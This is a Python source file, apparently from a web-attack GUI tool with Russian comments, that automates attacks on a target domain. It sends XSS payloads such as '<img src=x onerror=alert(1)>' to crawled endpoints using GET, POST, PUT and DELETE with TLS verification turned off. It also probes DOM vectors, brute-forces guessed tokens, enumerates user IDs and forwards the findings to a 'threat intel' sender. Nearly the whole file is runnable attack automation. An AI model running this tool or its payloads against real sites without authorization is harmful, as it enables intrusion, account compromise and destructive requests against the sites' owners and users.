# xss_security_gui/attack_engine.py

import time
import threading
import requests
from urllib.parse import urljoin, urlparse
import os
import json
import uuid
from collections import Counter
from xss_security_gui.sandbox_detector import detect_sandbox


class AttackEngine:
    """
    AttackEngine 5.0
    - Единый движок атак для GUI и CLI
    - Без attack_launcher.py и token_generator.py
    - Поддержка Modular AutoAttack + XSS-мутаций
    """

    def __init__(self, domain, threat_sender=None, log_func=None):
        self.domain = domain
        self.threat_sender = threat_sender or (lambda *a, **kw: None)
        self.log_func = log_func or (lambda msg, level="info": print(f"[{level}] {msg}"))
        self.results = []
        self.attack_id = str(uuid.uuid4())

        # === AttackEngine 5.0: базовые профили заголовков ===
        self.default_headers = {
            "User-Agent": "XSS-Security-GUI-AutoAttack/5.0",
            "Accept": "*/*",
        }

        self.header_profiles = [
            {},  # пустой профиль
            {"X-API-Key": "XSS-KEY"},
            {"Authorization": "Bearer XSS-Token"},
            {"Cookie": "session=XSSSESSION"},
            {"Cookie": "jwt=XSS-JWT"},
        ]


    # ===================== Вспомогательные =====================

    def _log(self, msg, level="info"):
        timestamp = time.strftime("%H:%M:%S")
        line = f"[{timestamp}] {msg}"
        self.log_func(line, level=level)

    # === Добавление результата ===
    def add_result(self, module_name: str, data: dict):
        entry = {
            "module": module_name,
            "data": data,
            "attack_id": self.attack_id
        }
        self.results.append(entry)

    # === Получение результатов (GUI вызывает это при экспорте) ===
    def get_attack_results(self):
        return self.results

    def _send_intel(self, attack_type: str, result: dict):
        try:
            self.threat_sender(
                module=attack_type,
                target=self.domain,
                result=result,
            )
        except Exception as e:
            self._log(f"⚠️ Ошибка ThreatSender: {e}", level="warn")

    def generate_tokens(self):
        """
        Заменяет старый token_generator.py.
        Генерирует набор тестовых токенов.
        """
        import secrets
        import base64

        static = [
            "test", "12345", "admin", "guest",
            "token", "secret", "apikey", "jwt",
            "bearer", "access", "session"
        ]

        random_tokens = [
            secrets.token_hex(8),
            secrets.token_hex(16),
            base64.b64encode(secrets.token_bytes(12)).decode("utf-8"),
        ]

        jwt_like = [
            f"{secrets.token_hex(4)}.{secrets.token_hex(8)}.{secrets.token_hex(4)}"
        ]

        return static + random_tokens + jwt_like

    def _record_result(self, attack_type: str, result: dict):
        """
        Унифицированная запись результата атаки (AttackEngine 5.0).
        Добавляет:
            • attack_id
            • attack_type
            • domain
            • timestamp
            • severity (если нет)
        И автоматически отправляет Threat Intel.
        """

        normalized = {
            "attack_id": self.attack_id,
            "attack_type": attack_type,
            "domain": self.domain,
            "timestamp": time.time(),
            "severity": result.get("severity", "info"),
            **result
        }

        # Добавляем в локальное хранилище результатов
        self.results.append(normalized)

        # Отправляем Threat Intel (если есть sender)
        try:
            self._send_intel(attack_type, normalized)
        except Exception as e:
            self._log(f"⚠️ Ошибка Threat Intel: {e}", level="error")

    def _make_request(self, method, endpoint, payload=None, headers=None):
        headers = headers or {"Content-Type": "application/json"}
        start = time.time()
        try:
            if method == "POST":
                r = requests.post(endpoint, json={"input": payload}, headers=headers, timeout=5)
            elif method == "PUT":
                r = requests.put(endpoint, json={"input": payload}, headers=headers, timeout=5)
            elif method == "DELETE":
                r = requests.delete(endpoint, headers=headers, timeout=5)
            else:  # GET
                r = requests.get(endpoint, params={"q": payload}, headers=headers, timeout=5)
            elapsed = (time.time() - start) * 1000.0
            return r, elapsed
        except Exception as e:
            return e, None

    def _group_by_type(self):
        return dict(Counter(r["type"] for r in self.results))

    def attack_payload(self, url: str, payload: str) -> dict:
        """
        Выполняет одиночную атаку XSS-пейлоадом.
        Возвращает словарь результата:
            {
                "status": "ok" / "error",
                "reflected": bool,
                "length": int,
                "response": str
            }
        """

        try:
            response = self._send_payload(url, payload)  # твой внутренний метод
            body = response.text if hasattr(response, "text") else str(response)

            reflected = payload in body

            return {
                "status": "ok",
                "reflected": reflected,
                "length": len(body),
                "response": body
            }

        except Exception as e:
            self.log_func(f"❌ Ошибка attack_payload: {e}", "error")
            return {
                "status": "error",
                "reflected": False,
                "length": 0,
                "response": ""
            }

    def _normalize_url(self, url: str) -> str:
        """
        Приводит URL к корректному виду:
        • добавляет https:// если схема отсутствует
        • обрабатывает //example.com
        """
        url = url.strip()
        if not url:
            return url

        parsed = urlparse(url)

        # //example.com → https://example.com
        if url.startswith("//") and not parsed.scheme:
            return "https:" + url

        # example.com → https://example.com
        if not parsed.scheme:
            return "https://" + url.lstrip("/")

        return url

    def _build_request_context(self, url: str, payload: str) -> dict:
        """
        Строит контекст запроса:
        • метод (GET/POST)
        • params / data / json
        • headers / cookies
        """
        ctx = {
            "method": "GET",
            "url": url,
            "params": {},
            "data": None,
            "json": None,
            "headers": {},
            "cookies": {},
            "timeout": 10,
            "verify": False,
        }

        # Базовый сценарий: GET с параметром x
        ctx["params"]["x"] = payload

        # Если в URL есть {payload} — подставляем прямо в URL
        if "{payload}" in url:
            ctx["url"] = url.replace("{payload}", payload)
            ctx["params"] = {}

        # Пример: если хотим иногда использовать POST (можно потом сделать настройкой)
        # Здесь оставим GET по умолчанию, но оставим задел:
        # if "login" in url or "submit" in url:
        #     ctx["method"] = "POST"
        #     ctx["data"] = {"x": payload}
        #     ctx["params"] = {}

        # Заголовки (можно расширять)
        ctx["headers"] = {
            "User-Agent": "XSS-Security-GUI-AutoAttack/1.0",
            "Accept": "*/*",
        }

        # Cookies (пока пусто, но можно интегрировать с сессией)
        ctx["cookies"] = {}

        return ctx

    def _send_payload(self, url: str, payload: str):
        """
        Отправляет XSS‑пейлоад на указанный URL.

        Поддерживает:
            • https:// и http://
            • URL без схемы (авто https://)
            • прямую подстановку {payload}
            • GET-параметры
            • задел под POST/JSON
            • кастомные headers/cookies

        Возвращает объект requests.Response.
        """
        try:
            # Нормализуем URL
            url = self._normalize_url(url)

            # Строим контекст запроса
            ctx = self._build_request_context(url, payload)

            method = ctx.pop("method").upper()

            if method == "GET":
                resp = requests.get(**ctx)
            elif method == "POST":
                resp = requests.post(**ctx)
            else:
                # На будущее, если появятся другие методы
                resp = requests.request(method, **ctx)

            return resp

        except Exception as e:
            if hasattr(self, "log_func"):
                self.log_func(f"❌ Ошибка _send_payload: {e}", "error")
            raise

            # ===================== Found Targets =====================

    def attack_found_targets(self, scripts, payloads=None, methods=None):
        payloads = payloads or [
            "<img src=x onerror=alert(1)>",
            "'\"><script>alert(1)</script>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>"
        ]
        methods = methods or ["GET", "POST", "PUT", "DELETE"]

        self._log("📎 Запуск атак по найденным JS-эндпоинтам...")

        for script in scripts:

            # Пропускаем всё, что не является словарём
            if not isinstance(script, dict):
                self._log(f"⚠️ Пропущен некорректный JS-объект: {script}", level="warn")
                continue

            fetches = (script.get("fetch_calls") or []) + (script.get("ajax_calls") or [])
            for endpoint in fetches:
                if not endpoint:
                    self._log("⚠️ Пропущен пустой endpoint.", level="warn")
                    continue
                if not str(endpoint).startswith("http"):
                    endpoint = urljoin(self.domain, endpoint)

                for method in methods:
                    for payload in payloads:
                        r, elapsed = self._make_request(method, endpoint, payload)
                        if isinstance(r, Exception):
                            self._record_result("endpoint_attack", {
                                "endpoint": endpoint,
                                "method": method,
                                "payload": payload,
                                "error": str(r),
                                "severity": "error"
                            })
                            self._log(f"❌ Ошибка: {endpoint} → {type(r).__name__}: {r}", level="error")
                            continue

                        text_sample = r.text[:20000] if r.text else ""
                        reflected = payload in text_sample
                        status = r.status_code
                        severity = "high" if reflected else "low"

                        result = {
                            "endpoint": endpoint,
                            "method": method,
                            "payload": payload,
                            "status": status,
                            "elapsed_ms": elapsed,
                            "reflected": reflected,
                            "response_size": len(r.content) if r.content else 0,
                            "severity": severity
                        }
                        self._record_result("endpoint_attack", result)
                        self._log(f"{severity.upper()} [{status}] {elapsed:.0f}ms {method} {endpoint}")

    # ===================== DOM Vectors =====================

    def attack_dom_vectors(self, scripts, dom_payloads=None):
        dom_payloads = dom_payloads or {
            "setTimeout": f"{self.domain}#alert(1)",
            "setInterval": f"{self.domain}#alert(1)",
            "window.name": "javascript:window.name='<img src=x onerror=alert(1)>'",
            "location.hash": f"{self.domain}#<img src=x onerror=alert(1)>",
            "postMessage": "window.postMessage('alert(1)', '*');"
        }

        self._log("🚀 DOM атака началась...")

        for script in scripts:
            sensitive = script.get("xss_sensitive", []) or []
            for vector in sensitive:
                payload_url = dom_payloads.get(vector)
                if not payload_url:
                    self._log(f"⚠️ Нет payload для {vector}", level="warn")
                    continue

                try:
                    start = time.time()
                    r = requests.get(payload_url, timeout=5)
                    elapsed = (time.time() - start) * 1000.0
                    reflected = "alert(1)" in (r.text[:20000] if r.text else "")
                    severity = "high" if reflected else "low"

                    result = {
                        "vector": vector,
                        "url": payload_url,
                        "status": r.status_code,
                        "elapsed_ms": elapsed,
                        "reflected": reflected,
                        "severity": severity
                    }
                    self._record_result("dom_vector_attack", result)
                    self._log(f"{severity.upper()} [{r.status_code}] {elapsed:.0f}ms {vector}")

                except Exception as e:
                    self._record_result("dom_vector_attack", {
                        "vector": vector,
                        "url": payload_url,
                        "error": str(e),
                        "severity": "error"
                    })
                    self._log(f"❌ {vector} → {type(e).__name__}: {e}", level="error")

    # ===================== Auto Attack =====================

    def run_modular_auto_attack(self, crawl_json: dict):
        """
        Modular AutoAttack 5.0 MAX
        - Sandbox анализ
        - API endpoints
        - Token brute force
        - Parameter reflection
        - User ID enumeration
        - XSS targets
        - GraphQL
        - Security headers
        - CSP
        - Secrets / API keys
        - Forms
        - Errors / stacktraces
        - JS endpoints / DOM vectors (если реализованы)
        """

        self._log("🧪 Modular AutoAttack 5.0 запущен...")

        try:
            # --- Извлечение данных ---
            visited = crawl_json.get("visited") or [self.domain]
            base_url = visited[0]

            tokens = crawl_json.get("tokens", [])
            user_ids = crawl_json.get("user_ids", [])
            api_endpoints = crawl_json.get("api_endpoints", [])
            parameters = crawl_json.get("parameters", [])
            xss_targets = crawl_json.get("xss_targets", [])
            scripts = crawl_json.get("scripts", [])
            graphql = crawl_json.get("graphql", [])
            headers_info = crawl_json.get("headers", [])
            csp_info = crawl_json.get("csp_analysis", [])
            secrets = crawl_json.get("secrets", [])
            api_keys = crawl_json.get("api_keys", [])
            forms = crawl_json.get("forms", [])
            errors = crawl_json.get("errors", [])

            # --- Sandbox / Headers / Tokens ---
            sandbox_info = detect_sandbox()
            sandboxed = sandbox_info.get("sandboxed", False)

            self._log(
                f"🧪 Sandbox анализ: sandboxed={sandboxed}, "
                f"score={sandbox_info.get('score')} severity={sandbox_info.get('severity')}",
                level="info"
            )

            # Threat Intel: sandbox
            self._record_result("sandbox_analysis", {
                "severity": "info" if not sandboxed else "warn",
                "sandboxed": sandboxed,
                "score": sandbox_info.get("score"),
                "indicators": sandbox_info.get("indicators", []),
            })

            session = requests.Session()
            headers_list = [{}] if sandboxed else self.build_headers_list(tokens)
            token_candidates = self.generate_tokens()

            # --- Универсальный wrapper ---
            def wrap(module_func, attack_type, *args):
                try:
                    results = module_func(*args) or []
                    for r in results:
                        self._record_result(attack_type, r)
                except Exception as e:
                    self._record_result(attack_type, {
                        "error": str(e),
                        "severity": "error"
                    })
                    self._log(f"❌ Ошибка в модуле {attack_type}: {e}", level="error")

            # --- Импорты модулей атак ---
            from xss_security_gui.auto_modules import (
                attack_api_endpoints,
                brute_force_tokens,
                attack_parameters,
                attack_user_ids,
                attack_xss_targets,
            )

            # --- Запуск модулей ---
            if api_endpoints:
                self._log("▶️ API Endpoints...")
                wrap(
                    attack_api_endpoints,
                    "api_attack",
                    session, base_url, api_endpoints, headers_list, self._log
                )

            if token_candidates:
                self._log("▶️ Token Brute Force...")
                wrap(
                    brute_force_tokens,
                    "token_attack",
                    session, base_url, token_candidates, self._log
                )

            if parameters:
                self._log("▶️ Parameters...")
                wrap(
                    attack_parameters,
                    "param_attack",
                    session, base_url, parameters, self._log
                )

            if user_ids:
                self._log("▶️ User IDs...")
                wrap(
                    attack_user_ids,
                    "user_attack",
                    session, base_url, user_ids, self._log
                )

            if xss_targets:
                self._log("▶️ XSS Targets...")
                wrap(
                    attack_xss_targets,
                    "xss_target_attack",
                    session, base_url, xss_targets, self._log
                )

            # --- GraphQL ---
            if graphql:
                self._log("▶️ GraphQL Endpoints...")
                for ep in graphql:
                    self._record_result("graphql", {
                        "endpoint": ep,
                        "severity": "info"
                    })

            # --- Security Headers ---
            if headers_info:
                self._log("▶️ Security Headers Review...")
                self._record_result("security_headers", {
                    "headers": headers_info,
                    "severity": "info"
                })

            # --- CSP ---
            if csp_info:
                self._log("▶️ CSP Weakness Scan...")
                self._record_result("csp_analysis", {
                    "csp": csp_info,
                    "severity": "info"
                })

            # --- Secrets / API Keys ---
            if secrets or api_keys:
                self._log("▶️ Secrets & API Keys...")
                self._record_result("secrets", {
                    "secrets": secrets,
                    "api_keys": api_keys,
                    "severity": "high" if secrets or api_keys else "info"
                })

            # --- Forms ---
            if forms:
                self._log("▶️ Forms & Inputs...")
                self._record_result("forms", {
                    "forms": forms,
                    "severity": "info"
                })

            # --- Errors / Stacktraces ---
            if errors:
                self._log("▶️ Error Pages & Stacktraces...")
                self._record_result("errors", {
                    "errors": errors,
                    "severity": "warn"
                })

            # --- JS атаки ---
            if scripts:
                self._log("▶️ JS Endpoint Attacks (fetch/ajax)...")
                if hasattr(self, "attack_found_targets"):
                    self.attack_found_targets(scripts)

                self._log("▶️ DOM Vector Attacks...")
                if hasattr(self, "attack_dom_vectors"):
                    self.attack_dom_vectors(scripts)

            self._log("✅ Modular AutoAttack завершён.")

        except Exception as e:
            self._record_result("auto_attack", {
                "target": self.domain,
                "error": str(e),
                "severity": "error"
            })
            self._log(f"❌ Modular AutoAttack ошибка: {type(e).__name__}: {e}", level="error")


    def build_headers_list(self, tokens):
        """
        Формирует расширенный список заголовков для перебора.
        Поддерживает:
            • API-ключи
            • JWT / Bearer
            • Cookies
            • Токены из краулинга
        """

        headers_set = [
            {},  # Без заголовков
            {"X-API-Key": "XSS-KEY"},
            {"Authorization": "Bearer XSS-Token"},
            {"Cookie": "session=XSSSESSION"},
            {"Cookie": "auth=XSSAUTH"},
            {"Cookie": "jwt=XSS-JWT"},
        ]

        # Токены из краулинга
        for token in tokens:
            if isinstance(token, dict):
                name = token.get("name") or token.get("header") or "X-Token"
                value = token.get("value") or "XSS-Test"
                headers_set.append({name: value})
            elif isinstance(token, str):
                headers_set.append({token: "XSS-Test"})

        return headers_set


    def run_auto_attack(self, crawl_json, sandbox_info=None, launcher=None):
        self._log("🧨 Запуск автоатаки...")

        def _run():
            try:
                start = time.time()

                # --- Логируем sandbox ---
                if sandbox_info:
                    self._log(f"🛡 Sandbox: {sandbox_info.get('sandboxed', False)}")

                # --- Запуск кастомного launcher ---
                if launcher:
                    self._log("🚀 Запуск кастомного launcher...")
                    try:
                        report = launcher(crawl_json, self._log) or {}
                    except Exception as e:
                        self._log(f"❌ Ошибка в launcher: {e}", level="error")
                        report = {"error": str(e)}
                else:
                    # --- Запуск модульной автоатаки ---
                    self._log("🧩 Запуск Modular AutoAttack...")
                    try:
                        self.run_modular_auto_attack(crawl_json)
                        report = {"status": "modular_auto_attack"}
                    except Exception as e:
                        self._log(f"❌ Ошибка в Modular AutoAttack: {e}", level="error")
                        report = {"error": str(e)}

                elapsed = (time.time() - start) * 1000.0

                # --- Формируем итог ---
                result = {
                    "target": crawl_json.get("url", self.domain),
                    "sandbox": bool(sandbox_info.get("sandboxed")) if isinstance(sandbox_info, dict) else False,
                    "sandbox_info": sandbox_info or {},
                    "report": report,
                    "elapsed_ms": elapsed,
                    "severity": "n/a"
                }

                self._record_result("auto_attack", result)
                self._log(f"✔️ Автоатака завершена за {elapsed:.0f}ms.")

            except Exception as e:
                # --- Глобальный fallback ---
                self._record_result("auto_attack", {
                    "target": self.domain,
                    "error": str(e),
                    "severity": "error"
                })
                self._log(f"❌ Ошибка автоатаки: {type(e).__name__}: {e}", level="error")

        # --- Запуск в отдельном потоке ---
        t = threading.Thread(target=_run, daemon=True, name="AutoAttackThread")
        t.start()

    # ===================== Экспорт и Сводка =====================

    def export_results(self, path="logs/attack_results.json"):
        try:
            os.makedirs(os.path.dirname(path), exist_ok=True)

            # Корректный подсчёт severity
            high = 0
            errors = 0
            for r in self.results:
                sev = r.get("severity") or r.get("data", {}).get("severity")
                if sev == "high":
                    high += 1
                elif sev == "error":
                    errors += 1

            summary = {
                "attack_id": self.attack_id,
                "domain": self.domain,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "count": len(self.results),
                "high": high,
                "errors": errors,
                "by_type": self._group_by_type(),
                "results": sorted(self.results, key=lambda x: x.get("module", ""))  # сортировка
            }

            with open(path, "w", encoding="utf-8") as f:
                json.dump(summary, f, indent=2, ensure_ascii=False)

            self._log(f"💾 Результаты атак сохранены: {path}")

        except Exception as e:
            self._log(f"❌ Ошибка экспорта результатов: {type(e).__name__}: {e}", level="error")

    def get_summary(self):
        # Корректный подсчёт severity
        high = 0
        errors = 0
        for r in self.results:
            sev = r.get("severity") or r.get("data", {}).get("severity")
            if sev == "high":
                high += 1
            elif sev == "error":
                errors += 1

        return {
            "attack_id": self.attack_id,
            "domain": self.domain,
            "count": len(self.results),
            "high": high,
            "errors": errors,
            "by_type": self._group_by_type(),
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }

    def send_summary_to_threat_intel(self):
        summary = self.get_summary()
        try:
            # Отправляем summary
            self._send_intel("attack_summary", summary)

            # Отправляем сами результаты (полезно для Threat Intel)
            self._send_intel("attack_results", self.results)

            self._log("📤 Сводка и результаты отправлены в Threat Intel.")

        except Exception as e:
            self._log(f"❌ Ошибка отправки сводки: {type(e).__name__}: {e}", level="error")